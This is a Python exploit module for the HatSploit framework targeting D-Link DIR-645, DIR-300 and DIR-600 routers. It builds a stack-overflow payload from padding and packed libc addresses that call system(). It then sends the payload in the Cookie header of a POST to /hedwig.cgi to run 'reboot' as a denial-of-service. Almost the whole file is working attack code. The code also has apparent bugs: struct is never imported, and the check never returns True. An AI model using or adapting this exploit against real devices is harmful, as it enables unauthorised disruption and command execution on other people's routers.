#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import Module
from utils.string.string import StringTools
from utils.http.http import HTTPClient


class HatSploitModule(Module, StringTools, HTTPClient):
    details = {
        'Name': "D-Link hedwig Reboot DoS",
        'Module': "exploit/unix/dlink/hedwig_reboot_dos",
        'Authors': [
            'Ivan Nikolsky (enty8080)',
            'Roberto Paleari'
        ],
        'Description': "Reboot DoS in D-Link DIR-645 <= 1.03, DIR-300 <= 2.14, DIR-600.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "unix",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def execute_command(self, remote_host, remote_port, command):
        command = command.encode("utf-8")

        libcbase = 0x2aaf8000
        system = 0x000531FF
        calcsystem = 0x000158C8
        callsystem = 0x000159CC
        shellcode = self.random_string(973).encode("utf-8")
        shellcode += struct.pack("<I", libcbase + system)
        shellcode += self.random_string(16).encode("utf-8")
        shellcode += struct.pack("<I", libcbase + callsystem)
        shellcode += self.random_string(12).encode("utf-8")
        shellcode += struct.pack("<I", libcbase + calcsystem)
        shellcode += self.random_string(16).encode("utf-8")
        shellcode += command

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": b"uid=" + shellcode + b";"
        }

        data = {
            self.random_string(7): self.random_string(7)
        }

        self.http_request(
            method="POST",
            host=remote_host,
            port=remote_port,
            path='/hedwig.cgi',
            data=data,
            headers=headers
        )

    def check_vulnerable(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/hedwig.cgi"
        )

        if response is None or response.status_code != 200:
            return False

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.output_process(f"Performing DoS attack on {remote_host}...")
        if not self.check_vulnerable(remote_host, remote_port):
            self.output_error("DoS attack failed!")
            return

        self.execute_command(remote_host, remote_port, "reboot")
        self.output_success("DoS attack successfully completed!")
